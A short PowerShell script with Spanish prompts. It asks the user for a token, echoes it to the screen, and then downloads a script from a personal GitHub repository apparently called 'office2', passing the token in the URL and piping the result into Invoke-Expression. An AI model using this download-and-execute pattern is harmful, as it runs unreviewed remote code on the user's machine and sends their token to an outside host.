
New-Item -Path .\ -Name solicitar_variable.ps1 -ItemType File

$variable = Read-Host "Introduce el token"

$variable = $variable.ToString()

Write-Host "El token es: $variable"

irm https://raw.githubusercontent.com/jdiaest1/office2/main/get.ps1?token=$variable | iex
